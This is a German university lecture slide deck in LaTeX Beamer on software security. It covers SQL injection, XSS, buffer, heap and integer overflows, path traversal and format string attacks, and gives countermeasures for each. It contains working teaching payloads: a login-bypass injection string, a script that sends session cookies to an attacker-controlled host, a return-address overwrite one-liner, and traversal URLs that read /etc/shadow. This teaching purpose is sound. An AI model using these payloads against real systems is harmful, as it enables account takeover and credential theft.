\documentclass[10pt]{beamer}

\usetheme[progressbar=frametitle]{metropolis}
\usepackage{appendixnumberbeamer}

\usepackage{booktabs}
\usepackage[scale=2]{ccicons}

\usepackage{pgfplots}
\usepgfplotslibrary{dateplot}

\usepackage{xspace}
\newcommand{\themename}{\textbf{\textsc{metropolis}}\xspace}

\usepackage{hyperref}

\usepackage{graphicx}
\graphicspath{ {pics/} }

\usepackage{listings}
\definecolor{mGreen}{rgb}{0,0.6,0}
\definecolor{mGray}{rgb}{0.5,0.5,0.5}
\definecolor{mPurple}{rgb}{0.58,0,0.82}
\definecolor{backgroundColour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{CStyle}{
    backgroundcolor=\color{backgroundColour},
    commentstyle=\color{mGreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{mGray},
    stringstyle=\color{mPurple},
    basicstyle=\footnotesize,
    breakatwhitespace=false,
    %breaklines=true,
    captionpos=b,
    keepspaces=true,
    %numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2,
    language=C
}

\lstdefinestyle{HTMLStyle}{
    backgroundcolor=\color{backgroundColour},
    commentstyle=\color{mGreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{mGray},
    stringstyle=\color{mPurple},
    basicstyle=\tiny,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2,
    language=HTML
}

\lstdefinestyle{BashStyle}{
    backgroundcolor=\color{backgroundColour},
    commentstyle=\color{mGreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{mGray},
    stringstyle=\color{mPurple},
    basicstyle=\footnotesize,
    breakatwhitespace=false,
    %breaklines=true,
    captionpos=b,
    keepspaces=true,
    %numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2,
    language=Bash
}

\lstdefinestyle{PHPStyle}{
    % backgroundcolor=\color{backgroundColour},
    commentstyle=\color{mGreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{mGray},
    stringstyle=\color{mPurple},
    basicstyle=\scriptsize,
    breakatwhitespace=true,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    % aboveskip=3em,
    %numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=1,
    language=PHP
}

\lstdefinestyle{SQLStyle}{
    % backgroundcolor=\color{backgroundColour},
    commentstyle=\color{mGreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{mGray},
    stringstyle=\color{mPurple},
    basicstyle=\scriptsize,
    breakatwhitespace=true,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    % aboveskip=3em,
    %numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=1,
    language=SQL
}


\lstdefinestyle{C2Style}{
    % backgroundcolor=\color{backgroundColour},
    commentstyle=\color{mGreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{mGray},
    stringstyle=\color{mPurple},
    basicstyle=\scriptsize,
    breakatwhitespace=true,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    % aboveskip=3em,
    %numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=1,
    language=C
}

%----------------------------------------------------------------------------------------
%	TITLE PAGE
%----------------------------------------------------------------------------------------

\title{Software Security}
\subtitle{Kryptographie und IT Sicherheit SS 2018}
% \date{\today}
\date{}
\author{Dmitrii Polianskii, Manuel Klappacher}
\institute{Universit\"at Salzburg}
% \titlegraphic{\hfill\includegraphics[height=1.5cm]{logo.pdf}}
\setcounter{tocdepth}{3}
\setcounter{secnumdepth}{3}
\setbeamertemplate{section in toc}[sections numbered]
\setbeamertemplate{subsection in toc}[subsections numbered]

\begin{document}

\maketitle

\begin{frame}{Themen}
  \setbeamertemplate{section in toc}[sections numbered]
  \tableofcontents
\end{frame}

%----------------------------------------------------------------------------------------
%	Einleitung
%----------------------------------------------------------------------------------------

\section{Einleitung}

\begin{frame}[fragile]{Wie entstehen Fehler und Sicherheitsl\"ucken?}
  \begin{itemize}
    \item Programmierfehler
      \begin{itemize}
        \item Treten sehr h\"aufig auf
        \item Logische Fehler, syntaktische Fehler, lexikalische Fehler
        \item Zeitdruck
        \item Mangelnde Kenntniss
        \item Keine ausreichenden Tests
      \end{itemize}
    \item Compilerfehler
      \begin{itemize}
        \item Treten nicht sehr h\"aufig auf
      \end{itemize}
    \item Absichtlich platzierte Backdoors
      \begin{itemize}
        \item Sehr schwer nachzuweisen - wie Unterscheidet man Fehler von b\"oswilliger Absicht?
        \item Werden auch von anderen Teilnehmern entdeckt und von Kriminellen dann f\"ur ihre Zwecke missbraucht
      \end{itemize}
    \item Zuviel Komplexit\"at
      \begin{itemize}
        \item Komplexe Systeme kann keiner mehr \"uberblicken
        \item schwer \"uber Sicherheit argumentierbar
      \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Einleitung - Statistiken}
  Most commonly exploited applications worldwide as of 3rd quarter 2017
  \newline
  \includegraphics[scale=0.5]{cyberattacks_2017}
  \newline
  Quelle: www.statista.com
\end{frame}

%----------------------------------------------------------------------------------------
%	OPEN SOURCE UND PROPERTÄRE SOFTWARE
%----------------------------------------------------------------------------------------

\begin{frame}[fragile]{Open Source Vorteile}
  \begin{itemize}
    \item Programmcode kann \"uberpr\"uft werden, Sicherheitsl\"ucken fallen leichter auf
    \item Erschwert implementierung von Backdoors
    \item Software kann von der Communtiy weiterentwickelt oder geforkt werden
    \item Bestimmte Funktionen k\"onnen abgedreht werden
  \end{itemize}
\end{frame}

%----------------------------------------------------------------------------------------
%	FIRMWARE SECURITY
%----------------------------------------------------------------------------------------

\begin{frame}[fragile]{Spezialfall Firmware}
  \begin{itemize}
    \item Ger\"at wurde bereits verkauft, kein Interesse des Herstellers an Updates
    \item Zu viele verschiedene Ger\"ate - Unm\"oglicher Verwaltungsaufwand
      \begin{itemize}
        \item Alleine Samsung hat bis 2014 56 verscheidene Smartphones pro Jahr herausgebracht
      \end{itemize}
    \item Firmware agiert in Schicht unter Betriebssystem - Angriffe k\"onnen vom Benutzer nicht erkannt oder verhindert werden
    \item Firmware meist Closed Source - keine Weiterentwicklung der Community
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Sicherheitsl\"ucken in Firmware - Beispiele}
  \begin{itemize}
    \item BadUSB - Eingabeger\"ate, USB-Sticks, Speichermedien, Kameras, ...
    \item Intel ME - Betriebssystem im Prozessor (AMD PSP)
      \begin{itemize}
        \item Funktionsweise undokumentiert
        \item Kritische L\"ucke 2017 entdeckt
        \item NSA und Google haben Intel ME abgeschaltet auf ihren Ger\"aten
      \end{itemize}
    \item Android
      \begin{itemize}
        \item praktisch alle Android Ger\"ate ohne Sicherheitupdates
      \end{itemize}
    \item Router, Smart TV's, IoT-Devices - Millionen angreifbare Ger\"ate in Haushalten, Firmen und Beh\"orden
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Smartphones Sicherheitsupdates}
  \includegraphics[scale=0.5]{android_sub}
  \newline
\end{frame}

%----------------------------------------------------------------------------------------
%	EXPLOITS
%----------------------------------------------------------------------------------------

%----------------------------------------------------------------------------------------
% Code Injection
% %----------------------------------------------------------------------------------------

% \section{Exploits}

% \subsection{Code Injections}

% \begin{frame}[fragile]{Code Injections}
%   Code Injection ist das ausnutzen von Bugs durch Eingabe von ungewollten Parametern, um dadurch die Ausf\"urung zu ver\"andern.
%   \newline
%   Kann folgende Auswirkungen haben:
%   \begin{itemize}
%     \item Daten in SQL Tabellen ver\"andern
%     \item Installieren von Malware durch Server-Scripting Code zB. PHP
%     \item Root Privilegien bekommen, durch Shell Injection oder Windows Service
%     \item Angriff auf Web User durch Cross-Site-Scripting in HTML/JS
%   \end{itemize}
% \end{frame}

%----------------------------------------------------------------------------------------
%	SQL INJECTION
%----------------------------------------------------------------------------------------

\section{SQL Injection}

\begin{frame}[fragile]{SQL Injection}
  SQL Injection kann verwendet werden, wenn die Benutzereingabe SQL-Befehle beeinflussen kann.
  \begin{itemize}
    \item Im Eingabeformular
    \item In der Browser query string
  \end{itemize}
  Der Angreifer vesucht eine Eingabe so zu erweitern, dass erw\"unschte SQL-Befehl ausgef\"urt wird. Oft verwendet man dafuer SQL-Metazeichen (\textbackslash „ ' und ;)
  % Ausnutzen von Sicherheitsl\"ucken in Zusammenhang mit SQL-Datenbanken.
  % SQL-Injections sind dann m\"oglich, wenn ungewollten Daten in den SQL-Interpreter gelangen.
  
\end{frame}
\begin{frame}[fragile]{SQL Injection}
  Folgen:
  \begin{itemize}
    \item Der Angreifer kann als Benutzer oder Administrator einloggen
    \item Daten k\"onnen auszusp\"ahen, ver\"andern oder gel\"oscht werden
    \item Im schlimmsten Fall kann jeder beliebiger SQL-Befehl ausgef\"uhrt werden
  \end{itemize}
\end{frame}

% \begin{frame}[fragile]{SQL Injection - Beispiel}
%   Es wird zus\"atzlicher Code bei Aufruf eingeschleust, der die Benutzertabelle modifiziert.
%   \newline
%   \includegraphics[scale=0.5]{sql_injection_1}
% \end{frame}

\begin{frame}[fragile]{SQL Injection - Beispiel}
  Als ein funktionierendes Beispiel betrachten wir eine Anmeldeseite
  \newline
  \newline
  \newline
  \begin{minipage}{0.49\textwidth}
    \centering
    \begin{figure}[h]
      \centering
      \includegraphics[width=0.5\textwidth]{sql_ex_1}
    \end{figure}
  \end{minipage}
  \begin{minipage}{0.49\textwidth}
    \centering
    \begin{table}[]
    \scriptsize 
    \centering
      \begin{table}[]
        \centering
        \label{my-label}
        \begin{tabular}{| l | l | l | l |}
          \hline
          ID & login & Password & Cookie \\
          \hline
          1 & admin & admin123 & sessionCoockie \\ 
          2 & user\_1 & 123 & sessionCoockie \\ 
          3 & user\_2 & 123 & sessionCoockie \\ 
          \hline
        \end{tabular} 
        \footnotesize
        \caption{SQL table}
      \end{table}
    \end{table}
  \end{minipage}
\end{frame}

\begin{frame}[fragile]{SQL Injection - Beispiel}
  Um die eingegebenen Daten zu \"uberpr\"ufen, fragt das Site-Skript die Datenbank ab, ob das angegebene User/Passwort-Paar existiert:
  \newline
  \begin{lstlisting}[style=SQLStyle]
    SELECT id, name FROM users
      WHERE name='$login' AND passwd='$passwd'
  \end{lstlisting}
  Wo \$login und \$passwd sind Werte aus dem Formular.
  \newline
  Dann \"uberpr\"uft den Script ob die Abfragen ein not-null Ergebnis zur\"uckgegeben:
  \newline
  \begin{lstlisting}[style=PHPStyle]
    $result->num_rows > 0
  \end{lstlisting}
\end{frame}

\begin{frame}[fragile]{SQL Injection - Beispiel}
  Um das SQL Injection auszunutzen, geben wir in das Name-field {\fboxsep=0pt\colorbox{mGreen!50}{\strut ' OR 0=0 -- }} ein, das Password kann beliebig sein.
  \newline
  Dann wird die Abfrage-Query im Skript so aussehen:
  \newline
  \begin{lstlisting}[style=SQLStyle]
    SELECT id, name FROM users
      WHERE name='' OR 0=0 -- ' AND passwd=''
  \end{lstlisting}
  \begin{itemize}
    \item Alles was nach {\fboxsep=0pt\colorbox{mGreen!50}{\strut -- }} steht, wird als Kommentar interpretiert.
    \item Weil 0=0 immer true ist, werden alle Datenbankeintr\"age zur\"uckgegeben.
    \item $num\_rows>0$ wird true liefern.
    \item Der Zugriff auf die Website wird erlaubt.
  \end{itemize}

\end{frame}

\begin{frame}[fragile]{Code Injection - Masnahmen}
  Gegenmaßnahmen:
  \begin{itemize}
    \item Escaping von Userinput (SQL-Metazeichen)
    \item Ueberprufung von Userinout mit Hilfe von Regular expressions
    \item Gespeicherte Funktionen in Datenbank
  \end{itemize}
\end{frame}

%----------------------------------------------------------------------------------------
%	CROSS SITE SCRIPTING
%----------------------------------------------------------------------------------------

\section{Cross Site Scripting (XSS)}

\begin{frame}[fragile]{Cross Site Scripting - XSS}
  Bei Cross-Site Scripting (XSS) gelingt es dem Angreifer, seinen Schadcode in eine vermeintlich vertrauenswürdige Umgebung einzubetten.
  % Bei Cross-Site Scripting (XSS) werden Sicherheitsl\"ucken in Webanwendungen ausgenutzt um schadhaften Code in sonst vertrauensw\"urdigen Websiten einzubinden.
  % Das ist der Fall wenn es Nicht-Vertrauensw\"urdigen Dritten erlaubt ist, Daten und Code hochzuladen.
  \newline
  Ziele:
  \begin{itemize}
    \item Benutzerkonten zu \"ubernehmen
    \item Session's coockies zu stehlen
    \item Daten (Identit\"atsdiebstahl) zu stehlen
  \end{itemize}
  % Der Browser des Benutzers kann nicht zwischen sch\"adlichem und gew\"unschtem Code unterscheiden.
\end{frame}

\begin{frame}[fragile]{Cross Site Scripting - XSS}
  Drei Arten von XSS:
  \begin{itemize}
    \item Reflektierte Angriffe
    \item Persistente Angriffe
    \item Lokales XSS
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Cross Site Scripting - reflektierte XSS}
  Beim reflektierte XSS wird eine Benutzereingabe direkt vom Server wieder zur\"uck gesendet.
  Wenn diese Eingabe Scriptcode enth\"alt, die vom Browser des Nutzers interpretiert wird, kann dort Schadcode ausgef\"urt werden.
  \newline
  \newline
  Ein Opfer klickt eine pr\"aparierte URL an, in der sch\"adlicher Code eingef\"ugt ist. Der Server \"ubernimmt diesen Code und generiert eine dynamisch ver\"anderte Webseite. Der Anwender sieht eine vom Angreifer manipulierte Webseite und h\"alt sie für vertrauensw\"urdig. 
  \newline
  \newline
  Dieser Typ hei{\ss}t auch nicht-persistent, da der Schadcode nur tempor\"ar bei der generierte Webseite existiert.
\end{frame}

\begin{frame}[fragile]{Cross Site Scripting - reflektierte XSS}
  Beispiel von reflektierte XSS: Suchfunktion.
  \newline
  Ein korrektes url:
  \begin{lstlisting}[style=CStyle]
    http://example.com/?suche=Suchbegriff
  \end{lstlisting}
  Url mit dem Schadecode:
  \begin{lstlisting}[style=CStyle]
    http://example.com/?suche=<script type=
          "text/javascript">alert("XSS")</script>
  \end{lstlisting}
  Result in Browser des Nutzers:
  \begin{lstlisting}[style=CStyle]
    <p>Sie suchten nach: <script type=
          "text/javascript">alert("XSS")</script></p>
  \end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Cross Site Scripting - Persistente XSS}
  Persistente XSS unterscheidet sich von reflektierenden Angriffen nur dadurch, dass der Schadcode auf dem Server gespeichert wird, wodurch er bei jeder Anfrage ausgef\"urt wird.
  Ist bei Webanwendungen m\"oglich, die Benutzereingaben serverseitig ohne Pr\"ufung speichern und diese sp\"ater wieder ausliefert. Persistentes XSS ist für den Angreifer eine bevorzugte Methode, da es nicht notwendig ist, den Benutzer dazu zu bringen, auf die gew\"unschte Link zu klicken.
  \newline
  Beispiel Posting auf Website:
  \begin{lstlisting}[style=CStyle]
    Eine sehr gutes Produkt!<script type=
          "text/javascript">alert("XSS")</script>
  \end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Cross Site Scripting - Lokales XSS}
  % Webapplikation auf dem Server ist hier nicht beteiligt, wird auch lokales XSS genannt.
  F\"ur lokales XSS ist keine Sicherheitsl\"ucke auf einem Webserver erforderlich. Der Schadcode wird direkt an den Anwender gesendet und beispielsweise im Browser ausgeführt, ohne dass der User dies bemerkt.
  \newline
  Falls der Browser besondere Rechte auf dem Rechner besitzt, ist es zudem möglich, lokale Daten auf dem Gerät zu verändern.
  \newline
  Ausgangspunkt des Angriffs ist das Anklicken eines manipulierten Links durch den Anwender.
  Somit auch statische HTML Seiten mit JavaScript unterst\"utzung anf\"allig f\"ur diesen Angriff.
\end{frame}

\begin{frame}[fragile]{Cross Site Scripting - Schutzma{\ss}nahmen}
  \begin{itemize}
    \item (Client side) Alle empfangene Links kritisch zu prüfen und nicht beliebig aufzurufen
    \item HTML-Metazeichen durch Zeichenreferenzen ersetzen (escapen), damit sie als normale Zeichen behandelt werden
    \item Input Validation, z.B. mit regular expression
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{XSS - Beispiel}
  \begin{itemize}
    \item Wir betrachten ein Beispiel, wie man eine User-Session mit Hilfe von XSS ergreifen kann.
    \item Wir haben ein ganz einfaches Chat-interface und koennen uns mit Hilfe von SQL-Injection als Admin einloggen.
    \item Ziel: Diebstahl der Benutzersession, so dass es m\"oglich w\"are, in seinem Namen in den Chat zu schreiben
  \end{itemize}
\end{frame}


\begin{frame}[fragile]{XSS - Beispiel}
  \begin{figure}[ht]
      \centering
      \includegraphics[width=\textwidth]{XSS-1.png}
      \caption{Anfangszustand}
      \label{fig:figure1}
  \end{figure}
\end{frame}

\begin{frame}[fragile]{XSS - Beispiel}
  \begin{itemize}
    \item Wir verwenden die XSS-Sicherheitsl\"ucke in Form, um unser eigenes Script in die Seite zu integrieren.
    \item F\"ullen wir das Feld 'new message' wie folgt:

    \begin{lstlisting}[style=PHPStyle]
      Please no Offtop in this thread.
      <script>
        img = new Image();
        img.src = "http://localhost:8000/cat.jpg?"+document.cookie;
      </script>
    \end{lstlisting}
    \item Annahme: die Zieladdresse (http://localhost:8000) geh\"ort zum Angreifer.
  \end{itemize}
\end{frame}


\begin{frame}[fragile]{XSS - Beispiel}
  \begin{figure}[ht]
      \centering
      \includegraphics[width=\textwidth]{XSS-2.png}
      \caption{Nach der Integration des Skripts}
      \label{fig:figure2}
  \end{figure}
\end{frame}

\begin{frame}[fragile]{XSS - Beispiel}
  \begin{itemize}
    \item Da die Website die Eingabe nicht \"uberpr\"uft, gelangt unser Skript in den Chat.
    \item Ab jetzt sendet jeder Besucher der Seites seine Cookies zum Angreifer.
    \item Der Angreifer dauert, bis der richtige Benutzer die Seite aufruft.
    \item Der Angreifer kann dann in seinem Browser Cookie-Werte ersetzen, so dass die Website ihn als Benutzer nimmt.
  \end{itemize}
\end{frame}


\begin{frame}[fragile]{XSS - Beispiel}
  \begin{figure}[ht]
      \centering
      \includegraphics[width=\textwidth]{XSS-3.png}
      \caption{User's cookies in attacker's server logs}
      \label{fig:figure3}
  \end{figure}
\end{frame}

%----------------------------------------------------------------------------------------
%	OVERFLOWS
%----------------------------------------------------------------------------------------

\section{Overflows}

\subsubsection{Buffer Overflows}

\begin{frame}[fragile]{Buffer Overflows}
  Durch Programmfehler werden zu gro{\ss}e Datenmengen in einen zu klein reservierten Speicherbereich geschrieben.
  (Buffer oder Stack, auch Pointer).
  \newline
  \newline
  $\rightarrow$ Daten werden \"uberschrieben:
  \begin{itemize}
    \item Schadcode wird ausgef\"uhrt
    \item Absturz des Programms
    \item Besch\"adigung oder Verf\"alschung von Daten
  \end{itemize}
  Zum Beispiel die R\"ucksprungadresse eines Unterprogrammes wird \"uberschrieben.
\end{frame}

\begin{frame}[fragile]{Buffer Overflows}
  Beg\"unstigt durch Van Neumann Architektur, Daten und Programm im selben Speicher.
  \begin{itemize}
    \item Compilierte und assemblierte Sprachen anf\"allig
    \item Anf\"allige Sprachen, z.B. C/C++
    \item Unsichere Libraries in C/C++
    \item Unsicheres Behandeln von Strings und Arraygr\"o{\ss}en
  \end{itemize}

  Schutzma{\ss}nahmen:
  \begin{itemize}
    \item Type-Safe Programmiersprachen verwenden, welche Memory Management zB Java, Python, Ruby,...
    \item \"Uberpr\"ufen auf Overflows bei User Eingaben
    \item in C sichere Methoden verwenden, \textit{get\_s} anstatt \textit{get}.
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Buffer Overflows - C Programm Memory Layout}
  \begin{minipage}{0.5\textwidth}
    \begin{figure}[H]
      \includegraphics[scale=0.50]{memory_layout}
    \end{figure}
  \end{minipage} \hfill
  \begin{minipage}{0.3\textwidth}
    \textbf{Stack:} lokale variablen \newline \newline
    \textbf{Heap:} Dynamisch allozierter Speicher (malloc) \newline \newline
    \textbf{Text:} ausf\"urbarer Code \newline
  \end{minipage}
\end{frame}

\begin{frame}[fragile]{Buffer Overflows - Type-Safe Sprachen}
  Compiler stellt Typsicherheit her, indem Datentypen gepr\"uft werden, damit keine Typverletzungen entstehen.
  Wenn Typverletzungen sp\"atestens zur Laufzeit erkannt werden, spricht man von Typsicheren Programmiersprachen.

  Beispiel String in Python, es reicht der Variable einen String zuzuweisen.
  \begin{lstlisting}[style=CStyle]
    mystring = "This is my string"
  \end{lstlisting}

  Beispiel in C, es muss der Typ deklariert und auch der Speicher manuell reserviert werden.
  \begin{lstlisting}[style=CStyle]
    char mystring[20] = "This is my string";
  \end{lstlisting}
  Wenn man in C nun einen 30 Byte String zuweist entsteht eine Overflow Situation.
\end{frame}

\begin{frame}[fragile]{Buffer Overflows - Compiler Ma{\ss}nahmen}
  Moderne Compiler wie neue Versionen des GNU C-Compilers erlauben die Aktivierung von \"Uberpr\"ufungscode-Erzeugung bei der \"Ubersetzung.

  \begin{itemize}
    \item Zufallsvariable erstellt und \"uberpr\"uft, bei Ver\"anderung wurde auch die RA \"uberschrieben.
    \item Kopie der R\"ucksprungadresse wird unterhalb lokaler Variablen abgelegt.
  \end{itemize}

  \begin{figure}%
   \centering
   {\includegraphics[scale=0.10]{stackgcc_1}}%
   \quad
   {\includegraphics[scale=0.10]{stackgcc_2}}%
  \end{figure}
\end{frame}

\begin{frame}[fragile]{Buffer Overflows}
 Die R\"ucksprungadresse eines Unterprogramms und dessen lokale Variablen werden auf einen als Stack bezeichneten Bereich zu gelegt.
 \begin{lstlisting}[style=CStyle]
  void input_line()
  {
    char line[1000];
    if (gets(line))
      puts(line);
  }
 \end{lstlisting}

 \begin{figure}%
  \centering
  {\includegraphics[scale=0.10]{stackoverflow}}%
  \quad
  {\includegraphics[scale=0.10]{stackoverflow_2}}%
 \end{figure}
\end{frame}

\begin{frame}[fragile]{Buffer Overflow - Beispiel}
  Wir betrachten folgende Programm:
  \begin{lstlisting}[style=C2Style]
    #include <stdio.h>

    void secretFunction(){
        printf("Congratulations!\n");
        printf("You have entered in the secret function!\n");
    }

    void brokenFunction(){
        char buffer[20];
        printf("Enter some text:\n");
        scanf("%s", buffer);
        printf("You entered: %s\n", buffer);    
    }

    int main(){
        brokenFunction();
        return 0;
    }

  \end{lstlisting}
  Unsere Ziel ist die Funktion secretFunction() aufrufen onhe direkten Befehl dazu
\end{frame}

\begin{frame}[fragile]{Buffer Overflow - Beispiel}
  Mit Hilfe des Programs objdump, schauen wir den Assemble-code von unserem Program.

  \begin{lstlisting}[style=C2Style]
    objdump -d vuln
  \end{lstlisting}

  \includegraphics[width=\textwidth]{buffer-1.png}
\end{frame}

\begin{frame}[fragile]{Buffer Overflow - Beispiel}
  Was k\"onen wir aus dem Assemblercode bestimmen:

  \begin{itemize}
    \item Die Adresse von secretFunction ist 00000000004005d6 in Hex. 
    \begin{lstlisting}[style=C2Style]
      00000000004005d6 <secretFunction>:
    \end{lstlisting}
    \item Die Adresse des Puffers beginnt 0x20 = 32 in Dezimal-Bytes vor \%ebp. Dies bedeutet, dass 32 Bytes f\"ur den Puffer reserviert sind, obwohl wir nur nach 20 Bytes gefragt haben.
    \begin{lstlisting}[style=C2Style]
      4005f5: 48 83 ec 20 sub $0x20,%rsp
    \end{lstlisting}
  \end{itemize}

\end{frame}

\begin{frame}[fragile]{Buffer Overflow - Beispiel}
  Jetzt wissen wir, dass 32 Bytes f\"ur den Puffer reserviert sind, es ist direkt neben \%ebp. Daher speichern wir die n\"achsten 4 Bytes den \%ebp und die n\"achsten 4 Bytes speichern die R\"uckkehradresse (die Adresse, zu der \%eip nach Abschluss der Funktion springen wird). Die ersten 28 + 4 = 32 Bytes w\"aren beliebige zuf\"allige Zeichen und die n\"achsten 4 Bytes sind die Adresse der secretFunction.

  \begin{itemize}
    \item Wir erstellen ein Inputfile mit Sprungaddress
    \begin{lstlisting}[style=C2Style]
      python -c 'print "a"*36 + "\x00\x00\x00\x00\xD6\x05\x40\x00"' > input.txt
    \end{lstlisting}
    \item Wir benutzen input.txt als Eingabedatei:
    \begin{lstlisting}[style=C2Style]
      ./prog < input.txt
    \end{lstlisting}
    \item Das Ergebnis:
    \includegraphics[width=\textwidth]{buffer-2.png}
  \end{itemize}

\end{frame}

\subsubsection{Heap Overflows}

\begin{frame}[fragile]{Buffer Overflows - Heap Overflows}
  Ist ein Buffer Overflow, der im Heap Bereich stattfindet.
  \begin{itemize}
    \item Daten werden zur Laufzeit gespeichert (malloc)
    \item Kein Limit, ausser RAM Gr\"o{\ss}e
    \item in iOS Jailbreaks verwenden Heap Overflows um Code in den Kernel zu injizieren
  \end{itemize}
  Gegenma{\ss}nahmen:
  \begin{itemize}
    \item Code und Daten trennen mit Prozessoren - NX-bit - No Execute Bit
    \item Betriebssysteme mit ASLR - Address Space Layout Randomization
    \item Checks im Heap Manager
  \end{itemize}
\end{frame}

\subsubsection{Integer Overflows}

\begin{frame}[fragile]{Integer Overflows}
  Entstehen wenn Operationen auf Integer die maximale Gr\"o{\ss}e \"uberschreiten. z.B. arithemetische oder cast Operationen.
  \begin{itemize}
    \item testen ob Maximaler Wert \"uberschritten ist
    \item Typen beachten, signed unsigned
    \item muss von Hand gemacht werden, keine nativen Methoden in Programmiersprachen
    \item in Java BigInt verwenden
  \end{itemize}
  \includegraphics[scale=0.25]{integer_overflow}
\end{frame}


%----------------------------------------------------------------------------------------
% PATH TRAVERSAL ATTACK
%----------------------------------------------------------------------------------------

\section{Path Traversal Attack}

\begin{frame}[fragile]{Path Traversal Attack}
  Ein HTTP Angriff, bei dem ein Angreifer Zugriff auf gesperrte Verzeichnisse gewinnt und Code ausserhalb des Web Root Verzeichnisses ausf\"uhrt.
  \newline
  \newline
  Web Container Encoding:
  \begin{lstlisting}[style=BashStyle]
  ..%c0%af represents ../
  ..%c1%9c represents ..\
  \end{lstlisting}

  Null bytes \%00 k\"onnen injeziert werden um Dateinahmen zu terminieren.
  \begin{lstlisting}[style=BashStyle]
  ?file=secret.doc%00.pdf
  \end{lstlisting}
  Java sieht .pdf, Betriebssystem sieht .doc
\end{frame}

\begin{frame}[fragile]{Path Traversal Attack - Beispiele}
  Beispiel Zugriff auf Dateien:
  \begin{lstlisting}[style=BashStyle]
  http://some_site.com.br/get-files.jsp?file=report.pdf
  http://some_site.com.br/some-page.asp?page=index.html
  \end{lstlisting}

  UNIX Passwort abgreifen:
  \begin{lstlisting}[style=BashStyle]
  http://some_site.com.br/../../../../etc/shadow
  http://some_site.com.br/get-files?file=/etc/passwd
  \end{lstlisting}

  Auch m\"oglich Dateien und Scripte von externen Websiten einzubinden:
  \begin{lstlisting}[style=BashStyle]
  http://some_site.com.br/some-page?page=http:
    //other-site.com.br/other-page.htm/malicius-code.php
  \end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Path Traversal Attack - Schutzma{\ss}nahmen}
  \begin{itemize}
    \item Nutzereingaben vermeiden wenn m\"oglich, bei Datei System Aufrufen
    \item Indexes anstatt Dateinahmen verwenden, f\"ur Benutzereingaben
    \item Nutzer soll nicht ganzen Pfad eingeben k\"onnen, mit eigenem Pfad umgeben
    \item Pfade normalisieren
    \begin{itemize}
      \item "." Segmente entfernen
      \item ".." - Segmente die ein nicht-".." Segment dafor haben werden entfernt
      \item Wenn Pfad relative und das erste Segment enth\"alt ein ":" Charackter dann wir ein "." vorangestellt
    \end{itemize}
  \end{itemize}
\end{frame}

%----------------------------------------------------------------------------------------
% FORMAT STRING ATTACK
%----------------------------------------------------------------------------------------

\section{Format String Attack}

\begin{frame}[fragile]{Format String Attack}
  Format Funktion ist eine ANSI C Funktion, um primitive Variablen in eine lesbare Ausgabe konvertieren. z.B. \textit{printf}, \textit{fprintf}
  \begin{itemize}
    \item Sind C/C++ Probleme
    \item treten heute nicht sehr h\"afig auf, da sie sich sehr leicht erkennen lassen
  \end{itemize}

  Ziele:
  \begin{itemize}
    \item Programmcrash
    \item Schadcode ausf\"uhrung
  \end{itemize}
\end{frame}

\begin{frame}[fragile]{Format String Attack - Beispiel I}
  \begin{lstlisting}[style=CStyle]
  int main (int argc, char **argv)
  {
     char buf [100];
     int x = 1 ;

     snprintf ( buf, sizeof buf, argv [1] ) ;
     buf [ sizeof buf -1 ] = 0;

     printf ( “Buffer size is: (%d)
          \nData input: %s \n” , strlen (buf) , buf ) ;

     printf ( “X equals: %d/ in
          hex: %#x\nMemory address
          for x: (%p) \n” , x, x, &x) ;

     return 0 ;
  }
  \end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Format String Attack - Beispiel II}
  Erwartete Eingabe:
  \begin{lstlisting}[style=BashStyle]
  ./formattest “Bob”
  \end{lstlisting}

  Ausgabe:
  \begin{lstlisting}[style=BashStyle]
  Buffer size is (3)
  Data input : Bob
  X equals: 1/ in hex: 0x1
  Memory address for x (0xbffff73c)
  \end{lstlisting}
\end{frame}

\begin{frame}[fragile]{Format String Attack - Beispiel III}
  Schwachstelle ausgenutzt, \%x := Ausgabe Hexadezimal:
  \begin{lstlisting}[style=BashStyle]
  ./formattest “Bob %x %x”
  \end{lstlisting}

  Anstatt \%x Wert von Bob auszugeben, gibt nun auch den Inhalt der Speicher Adresse aus:
  \begin{lstlisting}[style=BashStyle]
  Buffer size is (14)
  Data input : Bob bffff 8740
  X equals: 1/ in hex: 0x1
  Memory address for x (0xbffff73c)
  \end{lstlisting}

  \textit{printf} Argument sieht nun folgenderma{\ss}en aus:
  \begin{lstlisting}[style=CStyle]
  printf ( “Buffer size is: (%d) \n Data input:
      Bob %x %x \n” , strlen (buf) , buf ) ;
  \end{lstlisting}
\end{frame}

% \begin{frame}[fragile]{Buffer Overflows -Programm I}
%   \begin{lstlisting}[style=CStyle]
%   void secretFunction()
%   {
%     printf("Congratulations!\n");
%     printf("You have entered in the secret function!\n");
%   }

%   void echo()
%   {
%     char buffer[20];

%     printf("Enter some text:\n");
%     scanf("%s", buffer);
%     printf("You entered: %s\n", buffer);
%   }

%   int main()
%   {
%     echo();

